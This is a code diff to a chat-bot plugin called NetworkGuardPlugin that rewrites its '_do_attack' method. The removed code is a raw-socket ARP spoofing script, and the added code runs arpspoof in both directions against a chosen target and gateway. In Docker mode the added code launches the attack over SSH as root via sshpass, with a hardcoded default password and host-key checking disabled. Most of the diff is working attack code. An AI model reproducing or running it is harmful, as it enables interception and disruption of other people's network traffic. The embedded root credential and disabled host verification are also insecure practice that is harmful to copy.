@@ -332,83 +332,53 @@ class NetworkGuardPlugin(Star):
             return
 
         yield event.plain_result(f"未知指令: {msg}，发送 守卫帮助 查看帮助")
-    async def _do_attack(self, target_ip: str, gw_ip: str, duration: int):
-        """执行 ARP 攻击（单播，只影响目标设备）"""
-        # 写攻击脚本到临时文件
-        script = f'''#!/usr/bin/env python3
-import socket, struct, time
-
-def mb(m): return bytes.fromhex(m.replace(":", ""))
-def ib(ip): return bytes(int(x) for x in ip.split("."))
-
-sm = mb(open("/sys/class/net/eno1/address").read().strip())
-fm = mb("00:00:00:00:00:01")
-gw_ip = "{gw_ip}"
-target_ip = "{target_ip}"
-duration = {duration}
-
-gm, tm = None, None
-try:
-    with open("/AstrBot/data/arp_cache.txt") as f:
-        for line in f:
-            p = line.strip().split()
-            if len(p) >= 5 and "lladdr" in line:
-                if p[0] == gw_ip: gm = mb(p[p.index("lladdr")+1])
-                if p[0] == target_ip: tm = mb(p[p.index("lladdr")+1])
-except: pass
-if not gm: gm = fm
-if not tm: tm = fm
-
-sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-sock.bind(("eno1", 0))
-end = time.time() + duration
-cnt = 0
-while time.time() < end:
-    pkt1 = gm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(gw_ip) + fm + ib(target_ip)
-    pkt2 = tm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(target_ip) + fm + ib(gw_ip)
-    sock.send(pkt1)
-    sock.send(pkt2)
-    cnt += 2
-    time.sleep(0.5)
-sock.close()
-print(f"Done: {cnt}")
-'''
-        script_path = "/tmp/arp_attack_run.py"
-        with open(script_path, "w") as f:
-            f.write(script)
-
-        import subprocess as _sp
-        host = _get_cfg("ssh_host", "192.168.31.42")
-        pw = _get_cfg("ssh_password", "tommy12345")
-
+    async def _do_attack(self, target_ip, gw_ip, duration):
         try:
-            import os as _os
-            host = _get_cfg("ssh_host", "192.168.31.42")
-            pw = _get_cfg("ssh_password", "tommy12345")
             if _IN_DOCKER:
-                # Docker 模式：用 _ssh_cmd 执行（复用已有的函数）
-                result = _ssh_cmd(f"python3 /tmp/arp_attack_run.py", duration + 15)
+                # 写 bash 攻击脚本到共享目录
+                lines = [
+                    "#!/bin/bash",
+                    'pkill -f "arpspoof.*' + target_ip + '" 2>/dev/null',
+                    'pkill -f "arpspoof.*' + gw_ip + '" 2>/dev/null',
+                    "sleep 1",
+                    "arpspoof -i eno1-ovs -t " + gw_ip + " " + target_ip + " > /tmp/as1.log 2>&1 &",
+                    "arpspoof -i eno1-ovs -t " + target_ip + " " + gw_ip + " > /tmp/as2.log 2>&1 &",
+                    "sleep " + str(duration),
+                    'pkill -f "arpspoof.*' + target_ip + '" 2>/dev/null',
+                    'pkill -f "arpspoof.*' + gw_ip + '" 2>/dev/null',
+                    "arp -d " + target_ip + " 2>/dev/null",
+                    "arp -d " + gw_ip + " 2>/dev/null",
+                    "echo done"
+                ]
+                script = "\n".join(lines)
+                script_file = "/AstrBot/data/attack_" + target_ip + ".sh"
+                with open(script_file, "w") as f:
+                    f.write(script + "\n")
+                # 写 .sh 文件到共享目录，宿主机的 /vol1/@appdata/astrbot/data/ 对应
+                sh_path = "/vol1/@appdata/astrbot/data/attack_" + target_ip + ".sh"
+                host = _get_cfg("ssh_host", "192.168.31.42")
+                pw = _get_cfg("ssh_password", "tommy12345")
+                # SSH 执行共享卷上的脚本（后台运行）
+                proc = await asyncio.create_subprocess_exec(
+                    "sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
+                    "-o", "ConnectTimeout=10", "root@" + host,
+                    "nohup bash " + sh_path + " > /dev/null 2>&1 &",
+                    stdout=asyncio.subprocess.DEVNULL,
+                    stderr=asyncio.subprocess.DEVNULL
+                )
+                await asyncio.sleep(2)
+                try: proc.kill()
+                except: pass
+                logger.info("[NetworkGuard] ARP攻击已启动: " + target_ip + " " + str(duration) + "s")
             else:
-                # 非 Docker：本地执行
-                subprocess.run(["python3", script_path], capture_output=True, timeout=duration+15)
-                result = "OK"
-            logger.info(f"[NetworkGuard] ARP攻击: {result.strip()[:100] if result else '无输出'}")
+                import subprocess as _sp
+                _sp.Popen(["arpspoof", "-i", "eno1-ovs", "-t", gw_ip, target_ip])
+                _sp.Popen(["arpspoof", "-i", "eno1-ovs", "-t", target_ip, gw_ip])
+                await asyncio.sleep(duration)
+                _sp.run(["pkill", "-f", "arpspoof.*" + target_ip])
+                _sp.run(["pkill", "-f", "arpspoof.*" + gw_ip])
+                logger.info("[NetworkGuard] ARP攻击完成")
         except Exception as e:
-            import traceback
-            logger.error(f"[NetworkGuard] ARP攻击失败: {e}\\n{traceback.format_exc()[:200]}")
-            # 改为写文件方式（宿主机 cron 自动检测执行）
-            try:
-                import shutil as _sh
-                _sh.copy2(script_path, "/AstrBot/data/arp_attack_ready.py")
-                _os.chmod("/AstrBot/data/arp_attack_ready.py", 0o755)
-                logger.info("[NetworkGuard] 攻击脚本已写入 /AstrBot/data/arp_attack_ready.py，请在宿主机手动执行")
-            except:
-                pass
+            logger.error("[NetworkGuard] ARP攻击失败: " + str(e))
 
-
-
-
-
-
-
-
+    # ========== 指令处理 ==========
